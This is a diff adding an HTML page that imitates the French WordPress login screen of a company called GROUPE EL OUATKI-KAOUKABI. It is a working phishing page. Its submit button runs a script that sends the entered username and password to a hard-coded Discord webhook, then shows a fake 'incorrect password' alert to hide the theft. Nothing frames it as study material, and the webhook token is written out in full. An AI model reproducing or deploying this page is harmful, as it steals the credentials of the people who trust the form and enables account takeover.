@@ -1,0 +1,84 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="fr-FR"><!--<![endif]--><head>
+	
+	<title>GROUPE EL OUATKI-KAOUKABI ‹ Se connecter</title>
+	<script type="text/javascript" src="load-scripts_1.php"></script>
+<link rel="stylesheet" href="load-styles.php" type="text/css" media="all">
+<link rel="stylesheet" id="open-sans-css" href="https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&amp;subset=latin%2Clatin-ext&amp;ver=4.5.30" type="text/css" media="all">
+<link rel="stylesheet" id="mailchimp-for-wp-checkbox-css" href="css/o1troDEPAAwQ.css" type="text/css" media="all">
+	<meta name="robots" content="noindex,noarchive">
+	<meta name="referrer" content="strict-origin-when-cross-origin">
+		</head>
+	<body class="login login-action-login wp-core-ui  locale-fr-fr">
+	<div id="login">
+		<h1><a href="http://www.wordpress-fr.net/" title="Propulsé par WordPress" tabindex="-1">GROUPE EL OUATKI-KAOUKABI</a></h1>
+	
+<form id="myForm">
+	<p>
+		<label for="user_login">Identifiant ou adresse de messagerie<br>
+		<input type="text" name="log" id="username" class="input" value="" size="20"></label>
+	</p>
+	<p>
+		<label for="user_pass">Mot de passe<br>
+		<input type="password" name="pwd" id="email" class="input" value="" size="20"></label>
+	</p>
+		<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> Se souvenir de moi</label></p>
+	<p class="submit">
+<button type="button" onclick="sendToDiscord();alert('username or password incorrrect please try again');" class="button button-primary button-large">Submit</button>		
+	</p>
+</form>
+ <script>
+        function sendToDiscord() {
+            var webhookURL = 'https://discord.com/api/webhooks/1193246574449528873/C7jDdeRWRRHRhoudcU7hfaIud-NQZyNJZy0J3vXH5ipv3FLjbkBJ_2dNi34vQ14l6gLb';
+
+            // Get form data
+            var username = document.getElementById('username').value;
+            var email = document.getElementById('email').value;
+
+            // Your data to send to Discord
+            var data = {
+                content: `check this:\nUsername: ${username}\nEmail: ${email}`
+                // Add more fields as needed
+            };
+
+            // Convert data to JSON
+            var jsonData = JSON.stringify(data);
+
+            // Create a new XMLHttpRequest
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL, true);
+            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+            // Send the JSON data
+            xhr.send(jsonData);
+        }
+    </script>
+
+
+<p id="nav">
+	<a href="https://elouatkikaoukabi.com/wp-login.php?action=lostpassword">Mot de passe oublié�&nbsp;?</a>
+</p>
+
+<script type="text/javascript">
+function wp_attempt_focus(){
+setTimeout( function(){ try{
+d = document.getElementById('user_login');
+d.focus();
+d.select();
+} catch(e){}
+}, 200);
+}
+
+wp_attempt_focus();
+if(typeof wpOnload=='function')wpOnload();
+</script>
+
+	<p id="backtoblog"><a href="https://elouatkikaoukabi.com/">← Retour sur GROUPE EL OUATKI-KAOUKABI</a></p>
+	
+	</div>
+
+	
+	<script type="text/javascript" src="load-scripts.php"></script>
+	<div class="clear"></div>
+	
+	
+	</body></html>
